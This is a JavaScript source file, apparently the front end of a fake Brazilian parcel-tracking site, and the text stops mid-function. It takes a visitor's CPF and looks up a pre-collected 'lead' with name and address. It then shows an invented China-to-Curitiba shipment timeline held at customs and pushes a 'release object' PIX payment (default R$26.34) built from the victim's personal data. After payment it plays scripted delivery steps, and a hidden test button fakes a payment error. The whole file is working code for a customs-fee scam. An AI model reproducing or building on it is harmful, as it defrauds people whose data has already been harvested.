/**
 * Sistema de rastreamento baseado APENAS em dados do banco
 * SEM API DE CPF - APENAS DADOS DO SUPABASE
 */
import { DatabaseService } from '../services/database.js';
import { UIHelpers } from '../utils/ui-helpers.js';
import { CPFValidator } from '../utils/cpf-validator.js';
import { ZentraPayService } from '../services/zentra-pay.js';

export class TrackingSystem {
    constructor() {
        this.dbService = new DatabaseService();
        this.currentCPF = null;
        this.trackingData = null;
        this.leadData = null; // Dados do banco
        this.zentraPayService = new ZentraPayService();
        this.isInitialized = false;
        this.pixData = null;
        this.paymentErrorShown = false;
        this.paymentRetryCount = 0;
        
        console.log('TrackingSystem inicializado - DADOS DO BANCO');
        this.initWhenReady();
    }

    initWhenReady() {
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', () => this.init());
        } else {
            this.init();
        }
        
        // Fallbacks
        setTimeout(() => this.init(), 100);
        setTimeout(() => this.init(), 500);
        setTimeout(() => this.init(), 1000);
    }

    init() {
        if (this.isInitialized) return;
        
        console.log('Inicializando sistema de rastreamento baseado no banco...');
        
        try {
            this.setupEventListeners();
            this.handleAutoFocus();
            this.clearOldData();
            this.validateZentraPaySetup();
            this.isInitialized = true;
            console.log('Sistema de rastreamento inicializado com sucesso');
        } catch (error) {
            console.error('Erro na inicialização:', error);
            setTimeout(() => {
                this.isInitialized = false;
                this.init();
            }, 1000);
        }
    }

    validateZentraPaySetup() {
        if (this.zentraPayService.validateApiSecret()) {
            console.log('✅ API Zentra Pay configurada corretamente');
        } else {
            console.error('❌ Problema na configuração da API Zentra Pay');
        }
    }

    setupEventListeners() {
        console.log('Configurando event listeners...');
        this.setupFormSubmission();
        this.setupCPFInput();
        this.setupTrackButton();
        this.setupModalEvents();
        this.setupCopyButtons();
        this.setupAccordion();
        this.setupKeyboardEvents();
        console.log('Event listeners configurados');
    }

    setupFormSubmission() {
        const form = document.getElementById('trackingForm');
        if (form) {
            console.log('Form encontrado por ID');
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log('Form submetido via ID');
                this.handleTrackingSubmit();
            });
        }

        document.querySelectorAll('form').forEach((form, index) => {
            console.log(`Configurando form ${index}`);
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                e.stopPropagation();
                console.log(`Form ${index} submetido`);
                this.handleTrackingSubmit();
            });
        });
    }

    setupTrackButton() {
        console.log('Configurando botão de rastreamento...');
        
        const trackButton = document.getElementById('trackButton');
        if (trackButton) {
            console.log('Botão encontrado por ID: trackButton');
            this.configureTrackButton(trackButton);
        }

        document.querySelectorAll('.track-button').forEach((button, index) => {
            console.log(`Configurando botão por classe ${index}`);
            this.configureTrackButton(button);
        });

        document.querySelectorAll('button[type="submit"], button').forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                console.log(`Configurando botão por texto ${index}: ${button.textContent}`);
                this.configureTrackButton(button);
            }
        });

        document.addEventListener('click', (e) => {
            const target = e.target;
            if (target && target.tagName === 'BUTTON' && 
                target.textContent && target.textContent.toLowerCase().includes('rastrear')) {
                e.preventDefault();
                e.stopPropagation();
                console.log('Botão rastrear clicado via delegação');
                this.handleTrackingSubmit();
            }
        });
    }

    configureTrackButton(button) {
        const newButton = button.cloneNode(true);
        button.parentNode.replaceChild(newButton, button);
        
        newButton.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            console.log('Botão rastrear clicado:', newButton.id || newButton.className);
            this.handleTrackingSubmit();
        });

        newButton.style.cursor = 'pointer';
        newButton.style.pointerEvents = 'auto';
        newButton.removeAttribute('disabled');
        
        if (newButton.type !== 'submit') {
            newButton.type = 'button';
        }
        
        console.log('Botão configurado:', newButton.id || newButton.className);
    }

    setupCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.warn('Campo CPF não encontrado');
            return;
        }

        console.log('Configurando campo CPF...');
        
        cpfInput.addEventListener('input', (e) => {
            CPFValidator.applyCPFMask(e.target);
            this.validateCPFInput();
        });

        cpfInput.addEventListener('keypress', (e) => {
            this.preventNonNumeric(e);
        });

        cpfInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                this.handleTrackingSubmit();
            }
        });

        cpfInput.addEventListener('paste', (e) => {
            e.preventDefault();
            const pastedText = (e.clipboardData || window.clipboardData).getData('text');
            const cleanText = pastedText.replace(/[^\d]/g, '');
            if (cleanText.length <= 11) {
                cpfInput.value = cleanText;
                CPFValidator.applyCPFMask(cpfInput);
                this.validateCPFInput();
            }
        });

        cpfInput.addEventListener('focus', () => {
            cpfInput.setAttribute('inputmode', 'numeric');
        });

        console.log('Campo CPF configurado');
    }

    preventNonNumeric(e) {
        const allowedKeys = [8, 9, 27, 13, 46, 35, 36, 37, 38, 39, 40];
        if (allowedKeys.includes(e.keyCode) ||
            (e.keyCode === 65 && e.ctrlKey) ||
            (e.keyCode === 67 && e.ctrlKey) ||
            (e.keyCode === 86 && e.ctrlKey) ||
            (e.keyCode === 88 && e.ctrlKey)) {
            return;
        }
        
        if ((e.shiftKey || (e.keyCode < 48 || e.keyCode > 57)) && 
            (e.keyCode < 96 || e.keyCode > 105)) {
            e.preventDefault();
        }
    }

    validateCPFInput() {
        const cpfInput = document.getElementById('cpfInput');
        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        
        if (!cpfInput) return;

        const cleanCPF = CPFValidator.cleanCPF(cpfInput.value);
        
        trackButtons.forEach(button => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                if (cleanCPF.length === 11) {
                    button.disabled = false;
                    button.style.opacity = '1';
                    button.style.cursor = 'pointer';
                    cpfInput.style.borderColor = '#27ae60';
                } else {
                    button.disabled = true;
                    button.style.opacity = '0.7';
                    button.style.cursor = 'not-allowed';
                    cpfInput.style.borderColor = cleanCPF.length > 0 ? '#e74c3c' : '#e9ecef';
                }
            }
        });
    }

    async handleTrackingSubmit() {
        console.log('=== INICIANDO BUSCA APENAS NO BANCO ===');
        
        const cpfInput = document.getElementById('cpfInput');
        if (!cpfInput) {
            console.error('Campo CPF não encontrado');
            UIHelpers.showError('Campo CPF não encontrado. Recarregue a página.');
            return;
        }

        const cpfValue = cpfInput.value;
        const cleanCPF = CPFValidator.cleanCPF(cpfValue);
        
        console.log('CPF digitado:', cpfValue);
        console.log('CPF limpo:', cleanCPF);

        if (!CPFValidator.isValidCPF(cpfValue)) {
            console.log('CPF inválido');
            UIHelpers.showError('Por favor, digite um CPF válido com 11 dígitos.');
            return;
        }

        console.log('CPF válido, buscando APENAS no banco...');
        UIHelpers.showLoadingNotification();

        const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
        const originalTexts = [];
        
        trackButtons.forEach((button, index) => {
            if (button.textContent && button.textContent.toLowerCase().includes('rastrear')) {
                originalTexts[index] = button.innerHTML;
                button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Consultando...';
                button.disabled = true;
            }
        });

        try {
            // Aguardar um pouco para mostrar o loading
            await new Promise(resolve => setTimeout(resolve, 1500));

            console.log('🔍 Buscando no banco de dados...');
            
            // Buscar no banco de dados
            const dbResult = await this.getLeadFromLocalStorage(cleanCPF);
            
            if (dbResult.success && dbResult.data) {
                console.log('✅ LEAD ENCONTRADO NO BANCO!');
                console.log('📦 Dados do lead:', dbResult.data);
                
                this.leadData = dbResult.data;
                this.currentCPF = cleanCPF;
                
                UIHelpers.closeLoadingNotification();
                
                console.log('📋 Exibindo dados do banco...');
                this.displayOrderDetailsFromDatabase();
                this.generateRealTrackingData();
                this.displayTrackingResults();
                this.saveTrackingData();
                
                const orderDetails = document.getElementById('orderDetails');
                if (orderDetails) {
                    UIHelpers.scrollToElement(orderDetails, 100);
                }
                
                // Destacar botão de liberação se necessário
                setTimeout(() => {
                    this.highlightLiberationButton();
                }, 1500);
                
            } else {
                console.log('❌ CPF não encontrado no banco');
                UIHelpers.closeLoadingNotification();
                UIHelpers.showError('CPF inexistente. Não encontramos sua encomenda.');
            }
            
        } catch (error) {
            console.error('Erro no processo:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError('Erro ao consultar CPF. Tente novamente.');
        } finally {
            trackButtons.forEach((button, index) => {
                if (button.textContent && originalTexts[index]) {
                    button.innerHTML = originalTexts[index];
                    button.disabled = false;
                }
            });
            this.validateCPFInput();
        }
    }

    async getLeadFromLocalStorage(cpf) {
        return await this.dbService.getLeadByCPF(cpf);
    }

    displayOrderDetailsFromDatabase() {
        if (!this.leadData) return;

        console.log('📋 Exibindo dados do banco de dados');
        
        const customerName = this.getFirstAndLastName(this.leadData.nome_completo || 'Nome não informado');
        const formattedCPF = CPFValidator.formatCPF(this.leadData.cpf || '');
        
        // Dados básicos
        this.updateElement('customerName', customerName);
        this.updateElement('fullName', this.leadData.nome_completo || 'Nome não informado');
        this.updateElement('formattedCpf', formattedCPF);
        this.updateElement('customerNameStatus', customerName);
        
        // Produto
        let productName = 'Produto não informado';
        if (this.leadData.produtos && this.leadData.produtos.length > 0) {
            productName = this.leadData.produtos[0].nome || 'Produto não informado';
        }
        this.updateElement('customerProduct', productName);
        
        // Endereço completo formatado
        const fullAddress = this.leadData.endereco || 'Endereço não informado';
        this.updateElement('customerFullAddress', fullAddress);
        
        console.log('✅ Interface atualizada com dados do banco');
        console.log('👤 Nome exibido:', customerName);
        console.log('📄 Nome completo:', this.leadData.nome_completo);
        console.log('📍 Endereço:', fullAddress);
        console.log('📦 Produto:', productName);
        
        this.showElement('orderDetails');
        this.showElement('trackingResults');
    }

    generateRealTrackingData() {
        console.log('📦 Gerando dados de rastreamento reais do banco');
        
        if (!this.leadData) return;
        
        const currentStage = this.leadData.etapa_atual || 1;
        const stageNames = this.getStageNames();
        
        this.trackingData = {
            cpf: this.leadData.cpf,
            currentStep: currentStage,
            steps: [],
            liberationPaid: this.leadData.status_pagamento === 'pago',
            liberationDate: this.leadData.status_pagamento === 'pago' ? new Date().toISOString() : null,
            deliveryAttempts: 0,
            lastUpdate: this.leadData.updated_at || new Date().toISOString()
        };

        // Gerar etapas baseadas na etapa atual do banco
        for (let i = 1; i <= Math.max(currentStage, 11); i++) {
            const stepDate = new Date();
            stepDate.setHours(stepDate.getHours() - (Math.max(currentStage, 11) - i));
            
            this.trackingData.steps.push({
                id: i,
                date: stepDate,
                title: stageNames[i] || `Etapa ${i}`,
                description: stageNames[i] || `Etapa ${i}`,
                isChina: i >= 3 && i <= 7,
                completed: i <= currentStage,
                needsLiberation: i === 11 && this.leadData.status_pagamento !== 'pago'
            });
        }
        
        console.log('✅ Dados de rastreamento gerados baseados no banco');
        console.log('📊 Etapa atual:', currentStage);
        console.log('💳 Status pagamento:', this.leadData.status_pagamento);
    }

    getStageNames() {
        return {
            1: 'Seu pedido foi criado',
            2: 'O seu pedido está sendo preparado para envio',
            3: '[China] O vendedor enviou seu pedido',
            4: '[China] O pedido chegou ao centro de triagem de Shenzhen',
            5: '[China] Pedido saiu do centro logístico de Shenzhen',
            6: '[China] Coletado. O pedido está em trânsito internacional',
            7: '[China] O pedido foi liberado na alfândega de exportação',
            8: 'Pedido saiu da origem: Shenzhen',
            9: 'Pedido chegou no Brasil',
            10: 'Pedido em trânsito para CURITIBA/PR',
            11: 'Pedido chegou na alfândega de importação: CURITIBA/PR',
            12: 'Pedido liberado na alfândega de importação',
            13: 'Pedido sairá para entrega',
            14: 'Pedido em trânsito entrega',
            15: 'Pedido em rota de entrega',
            16: 'Tentativa entrega'
        };
    }

    displayTrackingResults() {
        this.updateStatus();
        this.renderTimeline();
        setTimeout(() => {
            UIHelpers.animateTimeline();
        }, 500);
    }

    updateStatus() {
        const statusIcon = document.getElementById('statusIcon');
        const currentStatus = document.getElementById('currentStatus');
        
        if (!statusIcon || !currentStatus) return;
        
        // Obter texto exato da etapa atual do banco de dados
        let stageText = '';
        if (this.leadData && this.leadData.etapa_atual) {
            // Usar o texto exato da etapa como está no banco
            const stageNames = this.getStageNames();
            stageText = stageNames[this.leadData.etapa_atual] || `Etapa ${this.leadData.etapa_atual}`;
        } else {
            stageText = 'Pedido chegou na alfândega de importação: CURITIBA/PR';
        }
        
        // Atualizar ícone baseado na etapa atual
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        
        if (currentStage >= 17) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else if (currentStage >= 13) {
            statusIcon.innerHTML = '<i class="fas fa-truck"></i>';
            statusIcon.className = 'status-icon in-delivery';
        } else if (currentStage >= 12) {
            statusIcon.innerHTML = '<i class="fas fa-check-circle"></i>';
            statusIcon.className = 'status-icon delivered';
        } else {
            statusIcon.innerHTML = '<i class="fas fa-clock"></i>';
            statusIcon.className = 'status-icon in-transit';
        }
        
        // Exibir apenas o texto exato da etapa atual
        currentStatus.textContent = stageText;
    }

    renderTimeline() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        timeline.innerHTML = '';
        
        // Mostrar apenas etapas até a etapa atual
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        
        this.trackingData.steps.forEach((step, index) => {
            // Mostrar apenas etapas até a etapa atual
            if (step.id <= currentStage) {
                const isLast = step.id === currentStage;
                const timelineItem = this.createTimelineItem(step, isLast);
                timeline.appendChild(timelineItem);
            }
        });
    }

    createTimelineItem(step, isLast) {
        const item = document.createElement('div');
        item.className = `timeline-item ${step.completed ? 'completed' : ''} ${isLast ? 'last' : ''}`;

        // Usar data real de atualização do lead ou data atual
        const stepDate = this.leadData && this.leadData.updated_at ? 
                        new Date(this.leadData.updated_at) : 
                        new Date();
        
        const dateStr = stepDate.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = stepDate.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        // Mostrar botão de liberação apenas na etapa 11 ou 12 (alfândega)
        const currentStage = this.leadData ? this.leadData.etapa_atual : 11;
        if ((step.id === 11 || step.id === 12) && currentStage <= 12) {
            buttonHtml = `
                <button class="liberation-button-timeline" data-step-id="${step.id}">
                    <i class="fas fa-unlock"></i> LIBERAR OBJETO
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${step.isChina ? '<span class="china-tag">[China]</span>' : ''}${step.description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        if ((step.id === 11 || step.id === 12) && currentStage <= 12) {
            const liberationButton = item.querySelector('.liberation-button-timeline');
            if (liberationButton) {
                liberationButton.addEventListener('click', () => {
                    this.openLiberationModal();
                });
            }
        }

        return item;
    }

    highlightLiberationButton() {
        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (!liberationButton) return;
        
        UIHelpers.scrollToElement(liberationButton, window.innerHeight / 2);
        
        setTimeout(() => {
            liberationButton.style.animation = 'pulse 2s infinite, glow 2s ease-in-out';
            liberationButton.style.boxShadow = '0 0 20px rgba(255, 107, 53, 0.8)';
            
            setTimeout(() => {
                liberationButton.style.animation = 'pulse 2s infinite';
                liberationButton.style.boxShadow = '0 4px 15px rgba(255, 107, 53, 0.4)';
            }, 6000);
        }, 500);
    }

    setupModalEvents() {
        const closeModal = document.getElementById('closeModal');
        if (closeModal) {
            closeModal.addEventListener('click', () => {
                this.closeModal('liberationModal');
            });
        }

        const closeDeliveryModal = document.getElementById('closeDeliveryModal');
        if (closeDeliveryModal) {
            closeDeliveryModal.addEventListener('click', () => {
                this.closeModal('deliveryModal');
            });
        }

        ['liberationModal', 'deliveryModal'].forEach(modalId => {
            const modal = document.getElementById(modalId);
            if (modal) {
                modal.addEventListener('click', (e) => {
                    if (e.target.id === modalId) {
                        this.closeModal(modalId);
                    }
                });
            }
        });
    }

    setupCopyButtons() {
        const copyButtons = [
            { buttonId: 'copyPixButtonModal', inputId: 'pixCodeModal' },
            { buttonId: 'copyPixButtonDelivery', inputId: 'pixCodeDelivery' }
        ];

        copyButtons.forEach(({ buttonId, inputId }) => {
            const button = document.getElementById(buttonId);
            if (button) {
                button.addEventListener('click', () => {
                    this.copyPixCode(inputId, buttonId);
                });
            }
        });
    }

    setupAccordion() {
        const detailsHeader = document.getElementById('detailsHeader');
        if (detailsHeader) {
            detailsHeader.addEventListener('click', () => {
                this.toggleAccordion();
            });
        }
    }

    setupKeyboardEvents() {
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                this.closeModal('liberationModal');
                this.closeModal('deliveryModal');
                UIHelpers.closeLoadingNotification();
            }
        });
    }

    async openLiberationModal() {
        console.log('🚀 Iniciando processo de geração de PIX com dados reais do banco...');
        UIHelpers.showLoadingNotification();

        try {
            if (!this.zentraPayService.validateApiSecret()) {
                throw new Error('API Secret do Zentra Pay não configurada corretamente');
            }

            const value = window.valor_em_reais || 26.34;
            console.log('💰 Valor da transação:', `R$ ${value.toFixed(2)}`);
            
            // Usar dados REAIS do banco
            const userData = {
                nome: this.leadData.nome_completo,
                cpf: this.leadData.cpf,
                email: this.leadData.email,
                telefone: this.leadData.telefone
            };
            
            console.log('👤 Dados REAIS do banco para pagamento:', {
                nome: userData.nome,
                cpf: userData.cpf,
                email: userData.email,
                telefone: userData.telefone
            });

            console.log('📡 Enviando requisição para Zentra Pay com dados reais...');
            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);

            if (pixResult.success) {
                console.log('🎉 PIX gerado com sucesso usando dados reais do banco!');
                console.log('📋 Dados recebidos:', {
                    transactionId: pixResult.transactionId,
                    externalId: pixResult.externalId,
                    pixPayload: pixResult.pixPayload
                });

                this.pixData = pixResult;
                UIHelpers.closeLoadingNotification();
                
                setTimeout(() => {
                    this.displayRealPixModal();
                    setTimeout(() => {
                        this.guideToCopyButton();
                    }, 800);
                }, 300);
            } else {
                throw new Error(pixResult.error || 'Erro desconhecido ao gerar PIX');
            }
        } catch (error) {
            console.error('💥 Erro ao gerar PIX:', error);
            UIHelpers.closeLoadingNotification();
            UIHelpers.showError(`Erro ao gerar PIX: ${error.message}`);
            
            setTimeout(() => {
                console.log('⚠️ Exibindo modal estático como fallback');
                this.displayStaticPixModal();
                setTimeout(() => {
                    this.guideToCopyButton();
                }, 800);
            }, 1000);
        }
    }

    showPaymentError() {
        this.paymentErrorShown = true;
        
        const errorOverlay = document.createElement('div');
        errorOverlay.id = 'paymentErrorOverlay';
        errorOverlay.className = 'modal-overlay';
        errorOverlay.style.display = 'flex';
        
        errorOverlay.innerHTML = `
            <div class="professional-modal-container" style="max-width: 450px;">
                <div class="professional-modal-header">
                    <h2 class="professional-modal-title">Erro de Pagamento</h2>
                    <button class="professional-modal-close" id="closePaymentErrorModal">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
                
                <div class="professional-modal-content" style="text-align: center;">
                    <div style="margin-bottom: 20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #e74c3c;"></i>
                    </div>
                    <p style="font-size: 1.1rem; margin-bottom: 25px; color: #333;">
                        Erro ao processar pagamento. Tente novamente.
                    </p>
                    <button id="retryPaymentButton" class="liberation-button-timeline" style="margin: 0 auto; display: block;">
                        <i class="fas fa-redo"></i> Tentar Novamente
                    </button>
                </div>
            </div>
        `;

        document.body.appendChild(errorOverlay);
        document.body.style.overflow = 'hidden';

        const closeButton = document.getElementById('closePaymentErrorModal');
        const retryButton = document.getElementById('retryPaymentButton');

        if (closeButton) {
            closeButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
            });
        }

        if (retryButton) {
            retryButton.addEventListener('click', () => {
                this.closePaymentErrorModal();
                this.openLiberationModal();
            });
        }

        errorOverlay.addEventListener('click', (e) => {
            if (e.target === errorOverlay) {
                this.closePaymentErrorModal();
            }
        });
    }

    closePaymentErrorModal() {
        const errorOverlay = document.getElementById('paymentErrorOverlay');
        if (errorOverlay) {
            errorOverlay.style.animation = 'fadeOut 0.3s ease';
            setTimeout(() => {
                if (errorOverlay.parentNode) {
                    errorOverlay.remove();
                }
                document.body.style.overflow = 'auto';
            }, 300);
        }
    }

    displayRealPixModal() {
        console.log('🎯 Exibindo modal com dados reais do PIX...');

        const qrCodeImg = document.getElementById('realPixQrCode');
        if (qrCodeImg && this.pixData.pixPayload) {
            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.pixData.pixPayload)}`;
            qrCodeImg.src = qrCodeUrl;
            qrCodeImg.alt = 'QR Code PIX Real - Zentra Pay Oficial';
            console.log('✅ QR Code atualizado com dados reais da API oficial');
        }

        const pixInput = document.getElementById('pixCodeModal');
        if (pixInput && this.pixData.pixPayload) {
            pixInput.value = this.pixData.pixPayload;
            console.log('✅ Código PIX Copia e Cola atualizado com dados reais da API oficial');
        }

        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            console.log('🎯 Modal PIX real exibido com sucesso');
            
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }

        console.log('🎉 SUCESSO: Modal PIX real exibido com dados válidos da Zentra Pay!');
    }

    addPaymentSimulationButton() {
        const modalContent = document.querySelector('.professional-modal-content');
        if (!modalContent || document.getElementById('simulatePaymentButton')) return;

        const buttonContainer = document.createElement('div');
        buttonContainer.style.cssText = `
            margin-top: 20px;
            padding: 15px;
            background: transparent;
            border-radius: 8px;
            border: none;
            text-align: center;
        `;

        buttonContainer.innerHTML = `
            <button id="simulatePaymentButton" style="
                background: transparent;
                color: #666;
                border: 1px solid #ddd;
                padding: 6px 12px;
                border-radius: 6px;
                cursor: pointer;
                font-weight: 600;
                transition: all 0.3s ease;
                opacity: 0.7;
                font-size: 12px;
                min-width: 30px;
                height: 28px;
            ">
                -
            </button>
        `;

        modalContent.appendChild(buttonContainer);

        const simulateButton = document.getElementById('simulatePaymentButton');
        if (simulateButton) {
            simulateButton.addEventListener('click', () => {
                this.simulatePayment();
            });

            simulateButton.addEventListener('mouseenter', function() {
                this.style.background = 'rgba(0, 0, 0, 0.05)';
                this.style.transform = 'translateY(-1px)';
                this.style.opacity = '1';
            });

            simulateButton.addEventListener('mouseleave', function() {
                this.style.background = 'transparent';
                this.style.transform = 'translateY(0)';
                this.style.opacity = '0.7';
            });
        }
    }

    simulatePayment() {
        this.closeModal('liberationModal');
        this.paymentRetryCount++;
        
        if (this.paymentRetryCount === 1) {
            // Primeira tentativa - mostrar erro
            setTimeout(() => {
                this.showPaymentError();
            }, 1000);
        } else {
            // Segunda tentativa - sucesso
            this.paymentRetryCount = 0;
            this.processSuccessfulPayment();
        }
    }

    async processSuccessfulPayment() {
        if (this.trackingData) {
            this.trackingData.liberationPaid = true;
        }

        // Atualizar no banco
        if (this.leadData) {
            await this.updatePaymentStatusInDatabase('pago');
        }

        const liberationButton = document.querySelector('.liberation-button-timeline');
        if (liberationButton) {
            liberationButton.style.display = 'none';
        }

        this.showSuccessNotification();

        // Continuar com próximas etapas
        setTimeout(() => {
            this.addPostPaymentSteps();
        }, 1000);
    }

    addPostPaymentSteps() {
        const timeline = document.getElementById('trackingTimeline');
        if (!timeline) return;

        const stageNames = this.getStageNames();
        const nextStages = [12, 13, 14, 15, 16]; // Etapas pós-pagamento

        nextStages.forEach((stageNumber, index) => {
            setTimeout(() => {
                const stepDate = new Date();
                const timelineItem = this.createTimelineItem({
                    id: stageNumber,
                    date: stepDate,
                    title: stageNames[stageNumber],
                    description: stageNames[stageNumber],
                    isChina: false,
                    completed: true,
                    needsLiberation: false
                }, index === nextStages.length - 1);

                timeline.appendChild(timelineItem);

                setTimeout(() => {
                    timelineItem.style.opacity = '1';
                    timelineItem.style.transform = 'translateY(0)';
                }, 100);

                timelineItem.scrollIntoView({ 
                    behavior: 'smooth', 
                    block: 'center' 
                });

            }, index * 30000); // 30 segundos entre cada etapa
        });
    }

    async updatePaymentStatusInDatabase(status) {
        if (!this.currentCPF) return;

        try {
            // Update in localStorage
            const leads = JSON.parse(localStorage.getItem('leads') || '[]');
            const leadIndex = leads.findIndex(l => l.cpf && l.cpf.replace(/[^\d]/g, '') === this.currentCPF);
            
            if (leadIndex !== -1) {
                leads[leadIndex].status_pagamento = status;
                leads[leadIndex].etapa_atual = 12; // Etapa liberado
                leads[leadIndex].updated_at = new Date().toISOString();
                localStorage.setItem('leads', JSON.stringify(leads));
                console.log('✅ Status de pagamento atualizado no localStorage:', status);
            }
        } catch (error) {
            console.error('❌ Erro ao atualizar status no localStorage:', error);
        }
    }

    showSuccessNotification() {
        const notification = document.createElement('div');
        notification.className = 'payment-success-notification';
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #27ae60;
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
            z-index: 9999;
            display: flex;
            align-items: center;
            gap: 10px;
            font-family: 'Inter', sans-serif;
            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
        `;

        notification.innerHTML = `
            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
            <div>
                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
            </div>
        `;

        document.body.appendChild(notification);

        if (!document.getElementById('notificationAnimations')) {
            const style = document.createElement('style');
            style.id = 'notificationAnimations';
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes fadeOut {
                    from { opacity: 1; }
                    to { opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        }

        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 5000);
    }

    displayStaticPixModal() {
        const modal = document.getElementById('liberationModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            setTimeout(() => {
                this.addPaymentSimulationButton();
            }, 500);
        }
        
        console.log('⚠️ Modal PIX estático exibido como fallback');
    }

    guideToCopyButton() {
        const copyButton = document.getElementById('copyPixButtonModal');
        const pixSection = document.querySelector('.pix-copy-section');
        
        if (!copyButton || !pixSection) return;

        pixSection.style.position = 'relative';
        
        const guide = document.createElement('div');
        guide.className = 'copy-guide-indicator';
        guide.innerHTML = '👆 Copie o código PIX aqui';
        guide.style.cssText = `
            position: absolute;
            top: -35px;
            right: 0;
            background: #ff6b35;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            animation: bounceIn 0.6s ease, fadeOutGuide 4s ease 2s forwards;
            z-index: 10;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(255, 107, 53, 0.4);
        `;

        pixSection.appendChild(guide);
        pixSection.style.animation = 'highlightSection 3s ease';

        setTimeout(() => {
            pixSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 200);

        setTimeout(() => {
            if (guide.parentNode) {
                guide.remove();
            }
            pixSection.style.animation = '';
        }, 6000);
    }

    closeModal(modalId) {
        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    toggleAccordion() {
        const detailsContent = document.getElementById('detailsContent');
        const toggleIcon = document.querySelector('.toggle-icon');
        
        if (!detailsContent || !toggleIcon) return;

        if (detailsContent.classList.contains('expanded')) {
            detailsContent.classList.remove('expanded');
            toggleIcon.classList.remove('rotated');
        } else {
            detailsContent.classList.add('expanded');
            toggleIcon.classList.add('rotated');
        }
    }

    copyPixCode(inputId, buttonId) {
        const input = document.getElementById(inputId);
        const button = document.getElementById(buttonId);
        
        if (!input || !button) return;

        try {
            input.select();
            input.setSelectionRange(0, 99999);

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(input.value).then(() => {
                    console.log('✅ PIX copiado via Clipboard API:', input.value.substring(0, 50) + '...');
                    this.showCopySuccess(button);
                }).catch(() => {
                    this.fallbackCopy(input, button);
                });
            } else {
                this.fallbackCopy(input, button);
            }
        } catch (error) {
            console.error('❌ Erro ao copiar PIX:', error);
            UIHelpers.showError('Erro ao copiar código PIX. Tente selecionar e copiar manualmente.');
        }
    }

    fallbackCopy(input, button) {
        try {
            const successful = document.execCommand('copy');
            if (successful) {
                console.log('✅ PIX copiado via execCommand:', input.value.substring(0, 50) + '...');
                this.showCopySuccess(button);
            } else {
                throw new Error('execCommand falhou');
            }
        } catch (error) {
            console.error('❌ Fallback copy falhou:', error);
            UIHelpers.showError('Erro ao copiar. Selecione o texto e use Ctrl+C.');
        }
    }

    showCopySuccess(button) {
        const originalText = button.innerHTML;
        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
        button.style.background = '#27ae60';
        
        setTimeout(() => {
            button.innerHTML = originalText;
            button.style.background = '';
        }, 2000);
    }

    handleAutoFocus() {
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('focus') === 'cpf') {
            setTimeout(() => {
                const cpfInput = document.getElementById('cpfInput');
                if (cpfInput) {
                    const trackingHero = document.querySelector('.tracking-hero');
                    if (trackingHero) {
                        UIHelpers.scrollToElement(trackingHero, 0);
                    }
                    
                    setTimeout(() => {
                        cpfInput.focus();
                        if (/Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                            cpfInput.setAttribute('inputmode', 'numeric');
                            cpfInput.setAttribute('pattern', '[0-9]*');
                            cpfInput.click();
                        }
                    }, 800);
                }
            }, 100);

            const currentPath = window.location.pathname;
            window.history.replaceState({}, document.title, currentPath);
        }
    }

    clearOldData() {
        try {
